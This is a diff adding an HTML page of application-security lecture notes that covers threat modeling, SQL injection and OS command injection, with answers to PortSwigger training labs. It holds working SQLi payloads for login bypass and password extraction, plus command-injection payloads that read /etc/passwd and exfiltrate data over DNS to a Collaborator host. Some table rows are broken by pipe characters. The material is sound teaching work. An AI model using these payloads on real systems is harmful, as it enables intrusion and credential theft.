@@ -1,0 +1,1020 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Lecture Notes · AppSec Notes</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=Geist:wght@400;500;600;700&family=Geist+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<style>
+:root{
+  --canvas:#000;--card:#0a0a0c;--elev:#101012;--deep:#06060a;
+  --hair:rgba(255,255,255,.06);--hair2:rgba(255,255,255,.14);--hair3:rgba(255,255,255,.22);
+  --ink:#fcfdff;--body:rgba(252,253,255,.86);--char:rgba(252,253,255,.7);--mute:#a1a4a5;--ash:#888e90;--stone:#464a4d;
+  --blue:#3b9eff;--green:#11ff99;--orange:#ff801f;--yellow:#ffc53d;--red:#ff2047;--purple:#7b3ff2;
+  --serif:"Instrument Serif","Tiempos Headline",Georgia,serif;
+  --sans:"Geist","Inter Tight","Inter",-apple-system,BlinkMacSystemFont,system-ui,sans-serif;
+  --mono:"Geist Mono","JetBrains Mono",ui-monospace,Menlo,monospace;
+}
+*,*::before,*::after{box-sizing:border-box}
+html{scroll-behavior:smooth;background:var(--canvas)}
+body{margin:0;background:var(--canvas);color:var(--ink);font-family:var(--sans);
+  font-size:15px;line-height:1.7;letter-spacing:-.005em;-webkit-font-smoothing:antialiased;
+  font-feature-settings:"ss01","ss03"}
+::selection{background:var(--ink);color:#000}
+a{color:var(--blue);text-decoration:none}
+a:hover{text-decoration:underline;text-underline-offset:3px}
+
+/* top bar */
+.bar{position:sticky;top:0;z-index:20;display:flex;align-items:center;gap:18px;
+  padding:0 24px;height:60px;background:rgba(0,0,0,.72);backdrop-filter:blur(18px) saturate(160%);
+  -webkit-backdrop-filter:blur(18px) saturate(160%);border-bottom:1px solid var(--hair)}
+.bar .home{display:inline-flex;align-items:center;gap:8px;font-size:13px;font-weight:500;color:var(--ink);white-space:nowrap}
+.bar .home .mk{width:24px;height:24px;border-radius:7px;background:var(--ink);color:#000;display:grid;place-items:center;
+  font-family:var(--serif);font-style:italic;font-size:15px;line-height:1}
+.bar .home:hover{text-decoration:none;opacity:.85}
+.bar .tabs{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+.bar .tab{font-size:12.5px;font-weight:500;color:var(--char);padding:6px 12px;border-radius:999px;
+  border:1px solid var(--hair2);background:transparent;transition:all .15s}
+.bar .tab:hover{color:var(--ink);border-color:var(--hair3);text-decoration:none}
+.bar .tab.active{color:#000;background:var(--ink);border-color:var(--ink)}
+@media(max-width:640px){.bar{height:auto;padding:10px 14px;flex-wrap:wrap}.bar .tabs{margin-left:0;width:100%}}
+
+/* doc heading band */
+.band{max-width:820px;margin:0 auto;padding:56px 24px 8px}
+.band .ey{font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--orange);margin-bottom:14px}
+.band h2{font-family:var(--serif);font-style:italic;font-weight:400;font-size:clamp(40px,7vw,68px);line-height:1;
+  letter-spacing:-.01em;margin:0;color:var(--ink);font-feature-settings:"ss01","liga"}
+.band .sub{font-size:15px;color:var(--char);margin-top:12px}
+
+/* article */
+.doc{max-width:820px;margin:0 auto;padding:24px 24px 120px}
+.doc h1{display:none} /* the md's own H1 — hidden, we show .band heading instead */
+.doc h2{font-family:var(--serif);font-style:italic;font-weight:400;font-size:34px;line-height:1.08;
+  letter-spacing:-.01em;color:var(--ink);margin:52px 0 14px;padding-top:18px;border-top:1px solid var(--hair);
+  font-feature-settings:"ss01","liga"}
+.doc h2:first-of-type{border-top:0;padding-top:0;margin-top:24px}
+.doc h3{font-family:var(--serif);font-style:italic;font-weight:400;font-size:25px;line-height:1.12;
+  letter-spacing:-.01em;color:var(--ink);margin:34px 0 10px;font-feature-settings:"ss01","liga"}
+.doc h4{font-family:var(--mono);font-size:12px;font-weight:500;letter-spacing:.06em;text-transform:uppercase;
+  color:var(--mute);margin:26px 0 8px}
+.doc p{color:var(--body);margin:0 0 14px}
+.doc strong{color:var(--ink);font-weight:600}
+.doc em{color:var(--ink)}
+.doc a{color:var(--blue)}
+.doc hr{border:0;border-top:1px solid var(--hair);margin:36px 0}
+.doc ul,.doc ol{padding-left:22px;margin:0 0 16px;color:var(--body)}
+.doc li{margin-bottom:6px}
+.doc li::marker{color:var(--stone)}
+.doc blockquote{margin:18px 0;padding:14px 18px;border-left:3px solid var(--orange);
+  background:var(--card);border-radius:0 8px 8px 0;color:var(--char)}
+.doc blockquote p{margin:0 0 8px}.doc blockquote p:last-child{margin:0}
+
+/* inline + block code */
+.doc code{font-family:var(--mono);font-size:.86em;background:var(--card);color:var(--ink);
+  padding:1.5px 6px;border-radius:4px;border:1px solid var(--hair2)}
+.doc pre{background:var(--deep);border:1px solid var(--hair2);border-radius:10px;
+  padding:16px 18px;overflow-x:auto;margin:14px 0 20px;-webkit-overflow-scrolling:touch}
+.doc pre code{background:none;border:0;padding:0;font-size:12.5px;line-height:1.65;color:var(--body)}
+.doc pre::-webkit-scrollbar{height:6px}.doc pre::-webkit-scrollbar-thumb{background:var(--hair2);border-radius:3px}
+
+/* tables */
+.doc table{width:100%;border-collapse:separate;border-spacing:0;border:1px solid var(--hair2);
+  border-radius:10px;overflow:hidden;margin:16px 0 24px;font-size:13.5px;background:var(--card);display:block;overflow-x:auto}
+.doc thead th{background:var(--elev);font-family:var(--mono);font-size:10.5px;font-weight:500;
+  letter-spacing:.08em;text-transform:uppercase;color:var(--mute);text-align:left;padding:11px 14px;
+  border-bottom:1px solid var(--hair2);white-space:nowrap}
+.doc tbody td{padding:10px 14px;border-bottom:1px solid var(--hair);color:var(--body);vertical-align:top;line-height:1.5}
+.doc tbody tr:last-child td{border-bottom:0}
+.doc tbody td:first-child{color:var(--ink);font-weight:500}
+
+/* back to top */
+.totop{position:fixed;bottom:22px;right:22px;z-index:30;width:42px;height:42px;border-radius:999px;
+  display:grid;place-items:center;background:var(--ink);color:#000;font-size:18px;border:0;cursor:pointer;
+  opacity:0;pointer-events:none;transition:opacity .2s;text-decoration:none}
+.totop.show{opacity:1;pointer-events:auto}
+.totop:hover{text-decoration:none}
+</style>
+</head>
+<body>
+<header class="bar">
+  <a class="home" href="index.html"><span class="mk">A</span>AppSec Notes</a>
+  <nav class="tabs"><a href="lecture-notes.html" class="tab active">Lecture Notes</a><a href="detailed-notes.html" class="tab">Detailed Notes</a><a href="portswigger-notes.html" class="tab">PortSwigger Notes</a></nav>
+</header>
+
+<div class="band">
+  <div class="ey">— Notes preview</div>
+  <h2>Lecture Notes</h2>
+  <div class="sub">SST · 7 sessions + assignment + flashcards</div>
+</div>
+
+<article class="doc">
+<h1>SST Application Security — Simplified Notes</h1>
+<blockquote>
+<p>One file, all 5 sessions, plain language, plus answers to every PortSwigger lab assigned in class.
+Companion file (full PortSwigger coverage of all 30 topics): <code>PortSwigger-WebSecurity-Notes.md</code></p>
+</blockquote>
+<hr>
+<h2>Contents</h2>
+<ol>
+<li><a href="#session-1">Session 1 — AppSec Basics &amp; DVWA</a></li>
+<li><a href="#session-2">Session 2 — Pentest Phases, Burp Suite, nmap</a></li>
+<li><a href="#session-3">Session 3 — Threat Modeling (STRIDE/DREAD)</a></li>
+<li><a href="#session-4--sql-injection">Session 4 — SQL Injection</a></li>
+<li><a href="#session-5--os-command-injection">Session 5 — OS Command Injection</a></li>
+<li><a href="#session-6--xss-dom-xss--clickjacking">Session 6 — XSS, DOM XSS &amp; Clickjacking</a></li>
+<li><a href="#session-7--xxe--ssti">Session 7 — XXE &amp; SSTI</a></li>
+<li><a href="#assignment">Assignment — Threat Model</a></li>
+<li><a href="#quick-exam-summary">Quick exam-style summary</a></li>
+</ol>
+<hr>
+<p><a name="session-1"></a></p>
+<h2>Session 1 — AppSec Basics &amp; DVWA</h2>
+<h3>What &quot;Application Security&quot; means in one line</h3>
+<p>Finding and fixing bugs in <em>software applications</em> before attackers find them.</p>
+<h3>CIA Triad</h3>
+<ul>
+<li><strong>C — Confidentiality:</strong> only the right people can read the data.</li>
+<li><strong>I — Integrity:</strong> data hasn&#39;t been changed without permission.</li>
+<li><strong>A — Availability:</strong> the service is up when users need it.</li>
+</ul>
+<h3>Why apps get hacked</h3>
+<p>Apps trust input they shouldn&#39;t. Every bug class boils down to: <em>user input was treated as if it were trusted code/data.</em></p>
+<h3>OWASP Top 10 (2021) — short form</h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Category</th>
+<th>One-line meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A01</td>
+<td>Broken Access Control</td>
+<td>User accesses things they shouldn&#39;t (IDOR, admin panel)</td>
+</tr>
+<tr>
+<td>A02</td>
+<td>Cryptographic Failures</td>
+<td>Weak/no encryption of sensitive data</td>
+</tr>
+<tr>
+<td>A03</td>
+<td>Injection</td>
+<td>SQL/Command/LDAP injection</td>
+</tr>
+<tr>
+<td>A04</td>
+<td>Insecure Design</td>
+<td>No threat model — bad architecture</td>
+</tr>
+<tr>
+<td>A05</td>
+<td>Security Misconfiguration</td>
+<td>Default passwords, debug pages on</td>
+</tr>
+<tr>
+<td>A06</td>
+<td>Vulnerable Components</td>
+<td>Old libraries with known CVEs</td>
+</tr>
+<tr>
+<td>A07</td>
+<td>Auth Failures</td>
+<td>Weak passwords, no MFA, broken sessions</td>
+</tr>
+<tr>
+<td>A08</td>
+<td>Data Integrity Failures</td>
+<td>Insecure deserialization, unsigned updates</td>
+</tr>
+<tr>
+<td>A09</td>
+<td>Logging &amp; Monitoring Failures</td>
+<td>No way to detect/respond to attacks</td>
+</tr>
+<tr>
+<td>A10</td>
+<td>SSRF</td>
+<td>Server fetches URLs attacker controls</td>
+</tr>
+</tbody></table>
+<h3>DVWA (Damn Vulnerable Web App)</h3>
+<p>A purposely-broken PHP app to practice on locally.</p>
+<ul>
+<li><strong>Setup:</strong> XAMPP / Docker → drop DVWA in <code>htdocs</code> → browse <code>http://localhost/dvwa</code> → &quot;Create / Reset Database&quot;.</li>
+<li><strong>Security level slider</strong> (Low/Medium/High/Impossible) lets you turn defences on/off.</li>
+<li><strong>Default creds:</strong> <code>admin / password</code>.</li>
+<li><strong>Practice progression:</strong> Brute Force → Command Injection → SQLi → File Upload → XSS → CSRF.</li>
+</ul>
+<hr>
+<p><a name="session-2"></a></p>
+<h2>Session 2 — Pentest Phases, Burp Suite, nmap</h2>
+<h3>The 8 phases of a pentest (memorize the order)</h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Phase</th>
+<th>Goal</th>
+<th>One key tool</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><strong>Reconnaissance</strong></td>
+<td>Gather public info about target</td>
+<td>theHarvester, Amass, Shodan</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>Threat Modeling</strong></td>
+<td>Decide what to attack first</td>
+<td>STRIDE, MS TMT</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>Scanning &amp; Enumeration</strong></td>
+<td>Find open ports, services, endpoints</td>
+<td>nmap, Gobuster, FFUF</td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>Vulnerability Analysis</strong></td>
+<td>Find known weaknesses</td>
+<td>Nuclei, Nessus, searchsploit</td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>Exploitation</strong></td>
+<td>Prove the bug is real</td>
+<td>Metasploit, Burp, SQLmap</td>
+</tr>
+<tr>
+<td>6</td>
+<td><strong>Post-Exploitation</strong></td>
+<td>Show real impact (priv-esc, dump creds)</td>
+<td>LinPEAS, Mimikatz</td>
+</tr>
+<tr>
+<td>7</td>
+<td><strong>Lateral Movement</strong></td>
+<td>Pivot to other machines</td>
+<td>CrackMapExec, Evil-WinRM</td>
+</tr>
+<tr>
+<td>8</td>
+<td><strong>Reporting</strong></td>
+<td>Write up what you found + how to fix</td>
+<td>Markdown, Dradis</td>
+</tr>
+</tbody></table>
+<p><strong>Golden rule:</strong> Never test without <strong>written authorisation</strong> (scope + ROE). Stay in scope. Document every action with timestamps.</p>
+<h3>Recon — passive vs active</h3>
+<ul>
+<li><strong>Passive:</strong> doesn&#39;t touch the target. Google dorking, Shodan, WHOIS, OSINT, certificate transparency logs.</li>
+<li><strong>Active:</strong> touches the target. nmap, dnsrecon, dirbusting.</li>
+</ul>
+<p>Useful <strong>Google dork operators</strong>: <code>site:</code>, <code>filetype:</code>, <code>intitle:&quot;index of&quot;</code>, <code>inurl:admin</code>, <code>&quot;password&quot; filetype:xlsx</code>.</p>
+<h3>nmap — the only commands you really need</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>nmap -sV -p- target</code></td>
+<td>Version detect on all 65,535 ports</td>
+</tr>
+<tr>
+<td><code>nmap -sC -sV target</code></td>
+<td>Default scripts + version (most common)</td>
+</tr>
+<tr>
+<td><code>nmap -A target</code></td>
+<td>Aggressive (OS+scripts+traceroute)</td>
+</tr>
+<tr>
+<td><code>nmap -sU -p 53,161 target</code></td>
+<td>UDP scan on DNS / SNMP</td>
+</tr>
+<tr>
+<td><code>nmap -Pn target</code></td>
+<td>Skip ping (host blocks ICMP)</td>
+</tr>
+<tr>
+<td><code>nmap --script vuln target</code></td>
+<td>Run vuln-check scripts</td>
+</tr>
+<tr>
+<td><code>nmap -oA output target</code></td>
+<td>Save in all 3 formats</td>
+</tr>
+</tbody></table>
+<h3>Web enumeration</h3>
+<ul>
+<li><strong>Gobuster / FFUF / Feroxbuster</strong> → directory and file brute-forcing.</li>
+<li><strong>Nikto</strong> → web server misconfig and CVE scan.</li>
+<li><strong>Burp Spider</strong> → crawl from the browser session.</li>
+</ul>
+<h3>Burp Suite — what each tool does (simple)</h3>
+<table>
+<thead>
+<tr>
+<th>Burp tool</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Proxy</strong></td>
+<td>Sits between browser and server. Intercept, modify, forward.</td>
+</tr>
+<tr>
+<td><strong>Repeater</strong></td>
+<td>Edit &amp; re-send a single request. (Ctrl+R to send to it)</td>
+</tr>
+<tr>
+<td><strong>Intruder</strong></td>
+<td>Send same request many times with different payloads.</td>
+</tr>
+<tr>
+<td><strong>Comparer</strong></td>
+<td>Diff two responses.</td>
+</tr>
+<tr>
+<td><strong>Decoder</strong></td>
+<td>URL / base64 / HTML decode-encode.</td>
+</tr>
+<tr>
+<td><strong>Collaborator</strong></td>
+<td>Catch DNS/HTTP callbacks from blind bugs.</td>
+</tr>
+<tr>
+<td><strong>Scanner</strong> (Pro)</td>
+<td>Automatic vuln scan.</td>
+</tr>
+</tbody></table>
+<p><strong>Intruder attack types — memorize the difference:</strong></p>
+<ul>
+<li><strong>Sniper:</strong> 1 payload list, 1 position at a time.</li>
+<li><strong>Battering Ram:</strong> 1 payload list, same value in all positions.</li>
+<li><strong>Pitchfork:</strong> 2 payload lists, run in parallel (1st of A with 1st of B).</li>
+<li><strong>Cluster Bomb:</strong> every combination of multiple lists.</li>
+</ul>
+<h3>Reporting — what every finding must contain</h3>
+<p><strong>Title · Severity (CVSS) · Affected Component · Description · Steps to Reproduce · Evidence · Business Impact · Remediation.</strong>
+Two audiences: execs (impact) and engineers (steps).</p>
+<hr>
+<p><a name="session-3"></a></p>
+<h2>Session 3 — Threat Modeling</h2>
+<h3>The 4 questions (Microsoft method)</h3>
+<ol>
+<li><strong>What are we building?</strong> → draw DFD.</li>
+<li><strong>What could go wrong?</strong> → apply STRIDE.</li>
+<li><strong>What do we do about it?</strong> → list mitigations.</li>
+<li><strong>Did we do a good job?</strong> → review and update.</li>
+</ol>
+<h3>Secure SDLC (&quot;Shift Left&quot;)</h3>
+<p>Build security into every phase. Fix cost grows ~10× per phase you delay:</p>
+<ul>
+<li>Design: ~$1 · Code: ~$10 · Test: ~$100 · Production: ~$1,000+.</li>
+<li><strong>SAST</strong> = static (code) testing. <strong>DAST</strong> = dynamic (running app) testing.</li>
+</ul>
+<h3>DFD — the 5 symbols (must know)</h3>
+<table>
+<thead>
+<tr>
+<th>Symbol</th>
+<th>Meaning</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>☐ Rectangle</td>
+<td><strong>External Entity</strong> (untrusted actor)</td>
+<td>Browser, mobile app</td>
+</tr>
+<tr>
+<td>○ Circle</td>
+<td><strong>Process</strong> (your code)</td>
+<td>API server, Lambda</td>
+</tr>
+<tr>
+<td>═══ Parallel lines</td>
+<td><strong>Data Store</strong></td>
+<td>DB, S3, Redis</td>
+</tr>
+<tr>
+<td>→ Arrow</td>
+<td><strong>Data Flow</strong></td>
+<td>HTTPS request, SQL query</td>
+</tr>
+<tr>
+<td>- - - Dashed box</td>
+<td><strong>Trust Boundary</strong></td>
+<td>Internet ↔ VPC</td>
+</tr>
+</tbody></table>
+<p><strong>Rule:</strong> every arrow crossing a trust boundary is an attack-surface entry → validate input there.</p>
+<h3>DFD levels — when to use which</h3>
+<ul>
+<li><strong>Level 0:</strong> whole system as 1 box. Use for scoping with execs.</li>
+<li><strong>Level 1:</strong> main processes + stores + boundaries. <strong>← use this for threat modeling.</strong></li>
+<li><strong>Level 2:</strong> sub-processes inside each Level-1 box. Used for detailed module review.</li>
+<li><strong>Level 3:</strong> function-level. Rarely needed.</li>
+</ul>
+<h3>STRIDE — memorize the table</h3>
+<table>
+<thead>
+<tr>
+<th>Letter</th>
+<th>Threat</th>
+<th>Violates</th>
+<th>Example</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>S</strong></td>
+<td>Spoofing</td>
+<td>Authentication</td>
+<td>Stolen cookie</td>
+<td>MFA, signed JWTs, mTLS</td>
+</tr>
+<tr>
+<td><strong>T</strong></td>
+<td>Tampering</td>
+<td>Integrity</td>
+<td>SQLi, MITM edit</td>
+<td>Parameterized queries, TLS, signatures</td>
+</tr>
+<tr>
+<td><strong>R</strong></td>
+<td>Repudiation</td>
+<td>Non-repudiation</td>
+<td>&quot;I didn&#39;t do it&quot;</td>
+<td>Audit logs (immutable)</td>
+</tr>
+<tr>
+<td><strong>I</strong></td>
+<td>Info Disclosure</td>
+<td>Confidentiality</td>
+<td>Stack trace, public S3</td>
+<td>Encrypt, custom errors, ACLs</td>
+</tr>
+<tr>
+<td><strong>D</strong></td>
+<td>Denial of Service</td>
+<td>Availability</td>
+<td>DDoS, ReDoS</td>
+<td>Rate-limit, autoscale, timeouts</td>
+</tr>
+<tr>
+<td><strong>E</strong></td>
+<td>Elevation of Privilege</td>
+<td>Authorization</td>
+<td>IDOR, role forgery</td>
+<td>RBAC, server-side authz</td>
+</tr>
+</tbody></table>
+<h3>DREAD — prioritize threats</h3>
+<p>Score each 1–10, then average:</p>
+<ul>
+<li><strong>D</strong>amage · <strong>R</strong>eproducibility · <strong>E</strong>xploitability · <strong>A</strong>ffected users · <strong>D</strong>iscoverability</li>
+<li>9–10 Critical · 7–8 High · 4–6 Medium · 1–3 Low.</li>
+</ul>
+<h3>Other frameworks (one line each)</h3>
+<ul>
+<li><strong>PASTA</strong> — 7-stage, business-risk centric. Used by enterprise.</li>
+<li><strong>LINDDUN</strong> — STRIDE but for <strong>privacy</strong> (GDPR).</li>
+<li><strong>Attack Trees</strong> — hierarchical: root = goal, branches = attack paths.</li>
+<li><strong>MITRE ATT&amp;CK</strong> — catalog of real adversary tactics &amp; techniques.</li>
+</ul>
+<h3>Login flow worked example</h3>
+<p>User → Browser → API → Auth → DB</p>
+<ul>
+<li><strong>S:</strong> stolen session cookie</li>
+<li><strong>T:</strong> SQLi in username field</li>
+<li><strong>R:</strong> no audit log of failed logins</li>
+<li><strong>I:</strong> &quot;username not found&quot; vs &quot;wrong password&quot; leaks accounts</li>
+<li><strong>D:</strong> credential stuffing locks real users out</li>
+<li><strong>E:</strong> forged JWT with admin role</li>
+</ul>
+<hr>
+<p><a name="session-4--sql-injection"></a></p>
+<h2>Session 4 — SQL Injection</h2>
+<h3>Root cause (one sentence)</h3>
+<p>The app glues user input into an SQL string, so the database can&#39;t tell where developer-code ends and attacker-input begins.</p>
+<h3>The 4 types of SQLi</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>What server shows you</th>
+<th>Test payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>In-band (classic / UNION)</strong></td>
+<td>Data in response</td>
+<td><code>&#39; UNION SELECT username, password FROM users--</code></td>
+</tr>
+<tr>
+<td><strong>Error-based</strong></td>
+<td>DB error in response</td>
+<td><code>&#39; AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--</code></td>
+</tr>
+<tr>
+<td><strong>Boolean blind</strong></td>
+<td>Page changes true/false</td>
+<td><code>&#39; AND SUBSTRING(pass,1,1)=&#39;a&#39;--</code></td>
+</tr>
+<tr>
+<td><strong>Time-based blind</strong></td>
+<td>Response delay only</td>
+<td><code>&#39; AND SLEEP(3)--</code> (MySQL) · `</td>
+</tr>
+</tbody></table>
+<h3>UNION rules (must know — exam favourite)</h3>
+<ol>
+<li><strong>Number of columns must match.</strong></li>
+<li><strong>Order of columns must match.</strong></li>
+<li><strong>Datatypes must be compatible.</strong></li>
+</ol>
+<p>Find column count: keep adding NULLs until no error.</p>
+<pre><code>&#39; UNION SELECT NULL--
+&#39; UNION SELECT NULL, NULL--
+&#39; UNION SELECT NULL, NULL, NULL--   ← 200 OK
+</code></pre>
+<p>Or use <code>&#39; ORDER BY 1--</code>, <code>ORDER BY 2--</code>, …until error.</p>
+<p>Find which column is text:</p>
+<pre><code>&#39; UNION SELECT &#39;a&#39;, NULL, NULL--
+&#39; UNION SELECT NULL, &#39;a&#39;, NULL--
+&#39; UNION SELECT NULL, NULL, &#39;a&#39;--
+</code></pre>
+<p>Column that returns the string visibly = the text-type column.</p>
+<h3>Comment syntax by DB</h3>
+<ul>
+<li><strong>MySQL/MariaDB:</strong> <code>--␣</code> (space after) or <code>#</code> or <code>/* */</code></li>
+<li><strong>PostgreSQL:</strong> <code>--</code> or <code>/* */</code></li>
+<li><strong>MSSQL:</strong> <code>--</code> or <code>/* */</code></li>
+<li><strong>Oracle:</strong> <code>--</code> only (every SELECT also needs <code>FROM dual</code>)</li>
+</ul>
+<h3>How <code>admin&#39;--</code> bypasses login</h3>
+<p>Query the dev wrote:</p>
+<pre><code class="language-sql">SELECT * FROM users WHERE username=&#39;INPUT&#39; AND password=&#39;INPUT&#39;
+</code></pre>
+<p>Attacker types username = <code>administrator&#39;--</code>:</p>
+<pre><code class="language-sql">SELECT * FROM users WHERE username=&#39;administrator&#39;--&#39; AND password=&#39;anything&#39;
+</code></pre>
+<p>Everything after <code>--</code> is comment — password check is gone.</p>
+<h3>How &quot;Gifts category&quot; lab works</h3>
+<p>Original query:</p>
+<pre><code class="language-sql">SELECT * FROM products WHERE category=&#39;Gifts&#39; AND released=1
+</code></pre>
+<p>Inject <code>Gifts&#39;+OR+1=1--</code>:</p>
+<pre><code class="language-sql">SELECT * FROM products WHERE category=&#39;Gifts&#39; OR 1=1 --&#39; AND released=1
+</code></pre>
+<p><code>OR 1=1</code> makes the WHERE always true → returns hidden (unreleased) products too.</p>
+<h3>The real fix</h3>
+<p><strong>Parameterized queries</strong> (a.k.a. prepared statements). The query <em>structure</em> is sent first, <em>data</em> is sent separately — the DB never confuses them.</p>
+<pre><code class="language-python"># SAFE
+cursor.execute(&quot;SELECT * FROM users WHERE username=%s AND password=%s&quot;,
+               (username, password))
+</code></pre>
+<h3>Defence in depth (after parameterized queries)</h3>
+<ul>
+<li>Least-privilege DB account (no DROP, no <code>xp_cmdshell</code>).</li>
+<li>Suppress raw error messages in prod.</li>
+<li>WAF (speed bump, not a wall).</li>
+<li>Input validation (use for type, not for safety).</li>
+</ul>
+<h3>PortSwigger labs — class answers</h3>
+<p><strong>Lab — SQLi in WHERE clause allowing retrieval of hidden data</strong>
+<code>?category=Gifts&#39;+OR+1=1--</code></p>
+<p><strong>Lab — SQLi allowing login bypass</strong>
+Username: <code>administrator&#39;--</code> · Password: anything.</p>
+<p><strong>Lab — UNION attack, determining number of columns</strong>
+<code>?category=Gifts&#39;+UNION+SELECT+NULL--</code> then add NULLs one-by-one until you get HTTP 200 with no error. (Lab has 3 columns.)</p>
+<p><strong>Lab — UNION, finding column with useful data type</strong>
+After confirming 3 columns:</p>
+<pre><code>&#39;+UNION+SELECT+&#39;a&#39;,NULL,NULL--
+&#39;+UNION+SELECT+NULL,&#39;a&#39;,NULL--
+&#39;+UNION+SELECT+NULL,NULL,&#39;a&#39;--
+</code></pre>
+<p>The one that renders the <code>&#39;a&#39;</code> on the page = the text column.</p>
+<p><strong>Lab — UNION retrieving data from other tables</strong>
+<code>&#39;+UNION+SELECT+username,password+FROM+users--</code> → log in as administrator with retrieved password.</p>
+<p><strong>Lab — SQLi listing unreleased products</strong>
+Same as the OR 1=1 lab — <code>Gifts&#39;+OR+1=1--</code> shows the unreleased items because the released=1 filter is bypassed.</p>
+<p><strong>Graded Lab A — SQLi with filter bypass via XML encoding</strong>
+The stock-check sends XML. The keyword <code>SELECT</code> is filtered. Use Hackvertor or manual XML/HTML entity-encode:</p>
+<pre><code class="language-xml">&lt;stockCheck&gt;
+  &lt;productId&gt;1&lt;/productId&gt;
+  &lt;storeId&gt;1 UNION &amp;#x53;ELECT username || &#39;~&#39; || password FROM users&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre>
+<p><code>&amp;#x53;</code> = <code>S</code>. WAF doesn&#39;t recognise the keyword; the parser decodes it before reaching the DB.</p>
+<p><strong>Graded Lab B — Blind SQLi with conditional responses</strong>
+TrackingId cookie. Test:</p>
+<pre><code>TrackingId=xyz&#39; AND &#39;1&#39;=&#39;1   ← &quot;Welcome back&quot; appears
+TrackingId=xyz&#39; AND &#39;1&#39;=&#39;2   ← no &quot;Welcome back&quot;
+</code></pre>
+<p>Extract administrator password char-by-char:</p>
+<pre><code>TrackingId=xyz&#39; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;a
+</code></pre>
+<p>Use <strong>Burp Intruder · Cluster bomb</strong> with two payload sets:</p>
+<ul>
+<li>Position 1 → character index (1..20)</li>
+<li>Position 2 → character (a-z A-Z 0-9)
+Grep &quot;Welcome back&quot; → for each position, the char where &quot;Welcome back&quot; appears is the right one. Assemble the password, log in.</li>
+</ul>
+<hr>
+<p><a name="session-5--os-command-injection"></a></p>
+<h2>Session 5 — OS Command Injection</h2>
+<h3>Root cause</h3>
+<p>Same as SQLi but the interpreter is the <strong>OS shell</strong> instead of the database. The app glues user input into a string passed to <code>system()</code>/<code>exec()</code>/<code>shell_exec()</code>.</p>
+<pre><code class="language-python"># VULNERABLE
+os.system(&quot;ping -c 1 &quot; + hostname)
+# Attacker sends:  8.8.8.8; whoami
+# Shell sees:      ping -c 1 8.8.8.8; whoami
+</code></pre>
+<h3>Shell metacharacters — know all 6 (+ newline)</h3>
+<table>
+<thead>
+<tr>
+<th>Char</th>
+<th>Name</th>
+<th>Behaviour</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>;</code></td>
+<td>Semicolon</td>
+<td>Run cmd2 <strong>always</strong> (most reliable)</td>
+</tr>
+<tr>
+<td>`</td>
+<td>`</td>
+<td>Pipe</td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>Logical AND</td>
+<td>cmd2 only if cmd1 <strong>succeeds</strong></td>
+</tr>
+<tr>
+<td>`</td>
+<td></td>
+<td>`</td>
+</tr>
+<tr>
+<td><code>$()</code> or <code>`cmd`</code></td>
+<td>Subshell</td>
+<td>Inline substitution</td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>Background</td>
+<td>cmd1 in bg, cmd2 starts immediately</td>
+</tr>
+<tr>
+<td><code>%0a</code></td>
+<td>URL-encoded newline</td>
+<td>Bypasses filters that only block <code>;</code> `</td>
+</tr>
+</tbody></table>
+<p>Windows uses <code>&amp;</code> (cmd.exe) or <code>;</code> (PowerShell). <code>type</code> instead of <code>cat</code>.</p>
+<h3>3 scenarios (decision tree)</h3>
+<ol>
+<li><strong>In-band</strong> (output visible) → <code>; cat /etc/passwd</code> and read response.</li>
+<li><strong>Time-based blind</strong> (no output) → <code>; sleep 5</code> — confirm by Burp&#39;s timer.</li>
+<li><strong>OOB blind</strong> (no output, time blocked) → Burp Collaborator: <code>; nslookup x.BURPCOLLAB</code>.</li>
+</ol>
+<p>Fallback: write to web root, fetch via HTTP — <code>; whoami &gt; /var/www/html/x.txt</code>.</p>
+<h3>Exfil via DNS (the graded lab)</h3>
+<pre><code>; nslookup $(whoami).BURPCOLLAB.burpcollaborator.net
+</code></pre>
+<p>The Collaborator log shows a DNS query whose subdomain = <code>whoami</code>&#39;s output.</p>
+<h3>The fix</h3>
+<p><strong>Don&#39;t invoke a shell with user input.</strong> Use list-form APIs that pass args directly to the OS:</p>
+<pre><code class="language-python"># SAFE — shell=False is default
+subprocess.run([&quot;ping&quot;, &quot;-c&quot;, &quot;1&quot;, hostname], shell=False)
+</code></pre>
+<p>With list form, <code>8.8.8.8; whoami</code> is treated as a literal hostname — <code>ping</code> just says &quot;unknown host&quot;. The semicolon has no power because there&#39;s no shell to interpret it.</p>
+<p><strong>Defence in depth:</strong> use language libs instead of shelling (e.g. Python <code>socket</code> for DNS), strict regex validation, least-privilege web user.</p>
+<h3>PortSwigger labs — class answers</h3>
+<p><strong>Lab 1 — OS command injection, simple case</strong>
+POST body, stock-check. Change <code>productID=1&amp;storeID=1</code> to:</p>
+<pre><code>productID=1&amp;storeID=1|whoami
+</code></pre>
